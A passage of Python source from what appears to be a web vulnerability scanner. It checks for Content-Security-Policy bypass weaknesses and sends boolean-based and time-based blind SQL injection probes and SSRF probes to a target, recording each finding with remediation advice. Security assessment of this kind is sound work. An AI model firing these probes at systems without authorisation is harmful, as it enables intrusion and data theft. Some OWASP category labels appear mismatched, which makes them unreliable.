        jsonp_cdns = ["ajax.googleapis.com", "cdn.jsdelivr.net", "cdnjs.cloudflare.com"]
        for cdn in jsonp_cdns:
            if cdn in csp:
                bypass_indicators.append(f"Trusted CDN {cdn} may host JSONP - CSP bypass possible")
                break

        if bypass_indicators:
            self._add(
                "A02:2025", "Security Misconfiguration", "MEDIUM",
                "Content-Security-Policy Bypass Vectors",
                "CSP is present but contains weaknesses that allow bypass:\n* "
                + "\n* ".join(bypass_indicators),
                evidence=f"CSP: {csp[:200]}",
                fix=(
                    "1. Remove 'unsafe-inline' and 'unsafe-eval'.\n"
                    "2. Use nonces or hashes for inline scripts.\n"
                    "3. Avoid wildcards in script-src.\n"
                    "4. Use strict-dynamic for trusted script loading."
                ),
                cwe="CWE-693", cvss="5.3"
            )

    def _sqli_boolean(self):
        """SQL Injection - boolean-based blind detection."""
        print("[SQLi-Boolean] Boolean-Based Blind SQLi...")
        params_to_test = list(set([
            "id","user","username","q","search","page","cat","item"
        ]) | self.discovered_params)

        for true_pl, false_pl in SQLI_BOOLEAN_PAYLOADS:
            for param in params_to_test:
                url_true  = self._build_url(params={param: true_pl})
                url_false = self._build_url(params={param: false_pl})
                r_true  = self._get(url_true)
                r_false = self._get(url_false)
                if not r_true or not r_false:
                    continue
                # Significant difference in response length = boolean blind
                diff = abs(len(r_true.text) - len(r_false.text))
                if (diff > 50 and
                        r_true.status_code == 200 and
                        r_false.status_code == 200):
                    self._add(
                        "A05:2025", "Injection", "CRITICAL",
                        "SQL Injection - Boolean-Based Blind",
                        f"Boolean SQLi via '{param}'. True condition returns "
                        f"{len(r_true.text)}b, false returns {len(r_false.text)}b "
                        f"(diff={diff}b). Full DB extraction possible with sqlmap.",
                        evidence=(
                            f"?{param}={true_pl} -> {len(r_true.text)}b | "
                            f"?{param}={false_pl} -> {len(r_false.text)}b"
                        ),
                        fix=(
                            "1. Use parameterized queries exclusively.\n"
                            "2. Never concatenate user input into SQL.\n"
                            "3. Use an ORM (SQLAlchemy, Hibernate)."
                        ),
                        cwe="CWE-89", cvss="9.8", sans="SANS #3"
                    )
                    return

    def _sqli_time_based(self):
        """SQL Injection - time-based blind detection."""
        print("[SQLi-Time] Time-Based Blind SQLi...")
        params_to_test = list(set([
            "id","user","username","q","search","page","cat"
        ]) | self.discovered_params)

        for payload, delay, description in SQLI_TIME_PAYLOADS:
            for param in params_to_test:
                url = self._build_url(params={param: payload})
                t0 = time.time()
                r  = self._get(url)
                elapsed = time.time() - t0
                if r and elapsed >= delay:
                    self._add(
                        "A05:2025", "Injection", "CRITICAL",
                        "SQL Injection - Time-Based Blind",
                        f"Time-based SQLi via '{param}' ({description}). "
                        f"Response delayed {elapsed:.1f}s (expected ?{delay}s). "
                        "DB contents extractable character by character.",
                        evidence=(
                            f"?{param}={payload[:50]} "
                            f"-> response in {elapsed:.1f}s"
                        ),
                        fix=(
                            "1. Use parameterized queries exclusively.\n"
                            "2. Never build SQL from user input.\n"
                            "3. Least-privilege DB accounts."
                        ),
                        cwe="CWE-89", cvss="9.8", sans="SANS #3"
                    )
                    return

    def _ssrf_extended(self):
        """Extended SSRF - cloud metadata, DNS rebind, all internal ranges."""
        print("[SSRF-Extended] Cloud metadata + DNS rebind...")

        for param in SSRF_PARAMS:
            for payload in SSRF_PAYLOADS:
                # GET param
                url = self._build_url(params={param: payload})
                r = self._get(url)
                if r and any(s in r.text.lower() for s in SSRF_SIGNS):
                    self._add(
                        "A10:2025", "Mishandling of Exceptional Conditions", "CRITICAL",
                        "SSRF - Cloud Metadata / Internal Network",
                        f"SSRF via '{param}' reached internal resource ({payload}).",
                        evidence=f"?{param}={payload} -> internal/metadata response",
                        fix=(
                            "1. Validate URLs against strict allowlist.\n"
                            "2. Block private IP ranges at network level.\n"
                            "3. Use AWS IMDSv2 with session token.\n"
                            "4. Deploy SSRF-aware WAF rules."
                        ),
                        cwe="CWE-918", cvss="9.8", sans="SANS #25"
                    )
                    return

                # POST JSON param
                r2 = self._post(self.target, json_data={param: payload})
                if r2 and any(s in r2.text.lower() for s in SSRF_SIGNS):
                    self._add(
                        "A10:2025", "Mishandling of Exceptional Conditions", "CRITICAL",
                        "SSRF via POST Parameter",
                        f"SSRF via POST '{param}'. Internal network accessible.",
                        evidence=f"POST {param}={payload} -> internal response",
                        fix="Validate all user-supplied URLs. Block private IPs at network level.",
                        cwe="CWE-918", cvss="9.8"
                    )
                    return